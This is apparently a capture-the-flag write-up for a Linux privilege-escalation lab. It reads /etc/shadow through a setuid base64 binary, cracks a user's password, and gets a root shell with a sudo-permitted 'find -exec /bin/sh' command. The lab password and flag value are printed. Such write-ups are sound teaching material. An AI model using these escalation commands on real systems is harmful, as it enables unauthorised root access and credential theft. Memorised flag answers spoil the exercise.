## There is no guide to solve the task. Just informed you've learnt alot to solve the exercise from gained information

Credentials of one user are provided as follow :

Username: leonard
Password: Penny123


let's go then ............... 😎😎

# What is the content of the flag1.txt file?

There is no indication where exactly the flag1.txt file is available. 
Let's use the find command to located the flag by running the following command: 

find / -name flag1.txt  2>/dev/null 

But it will result in nothing because flag may be hidden in somewhere where you've no permissions.

Now it's time to check how many users are available : 

[leonard@ip-10-10-6-20 home]$ ls
leonard  missy  rootflag

Try to enter as missy or rootflag user, it will ask you for password which unfortunately you don't have. 

let's now analyzed as leonard user, can we run commands with "sudo". OH NO! 😥, even you don't have that option. 

Let's find some binaries which have set user ID permission bit is set 
_______________________________________________________________________________

[leonard@ip-10-10-6-20 ~]$ find / -type f -perm -4000 2>/dev/null | grep base64
/usr/bin/base64
[leonard@ip-10-10-6-20 ~]$ 
________________________________________________________________________________

I grep command with base64 because I knew base64 binary have setuid. For you try to use without grep and understand how it works. 
Now when I have found the vulnerability, I will use this to read the passwords (shadow) and usernames of user which are stored.
I will store the them in text files and unshadow them and Crack the password of other users 
Note: if you don't understand what is happening here , visit this : https://github.com/imahmedmunir/picoCTF-2024/blob/main/dont-you-love-banners

ONce you go through this , you'll be able to crack the password of user "missy"
PASSWORD IS Password1 😎😍

# What is the content of the flag2.txt file?

let's directly get to answer:
see if you've sudo command as user missy to run something with sudo 
___________________________________________________________________

[missy@ip-10-10-6-20 ~]$ whoami
missy
[missy@ip-10-10-6-20 ~]$ sudo -l
Matching Defaults entries for missy on ip-10-10-6-20:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-10-6-20:
    (ALL) NOPASSWD: /usr/bin/find
[missy@ip-10-10-6-20 ~]$ 
_____________________________________________________________________________________________
So, user missy can run find command with sudo 

let's find flag2.txt now 

____________________________________________________

[missy@ip-10-10-6-20 ~]$ sudo find / -name flag2.txt 2>/dev/null
/home/rootflag/flag2.txt

--------------------------------------------------
You found the path , but again the same issue you've no password for user rootflag.

Worry not 😎

This time you've access to run find command with elevated privileges. 
So, run it with some logic and get the root access ................
_______________________________________________________________

[missy@ip-10-10-6-20 ~]$ sudo find / -exec /bin/sh \; -quit
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2# 
__________________________________________________________________________________________

You easily got it , now you're root. Switch to directory and read the content  of flag2.txt
______________________________________________________________________________________

sh-4.2# cat /home/rootflag/flag2.txt
THM-168824782390238
sh-4.2# 

Happy Hacker
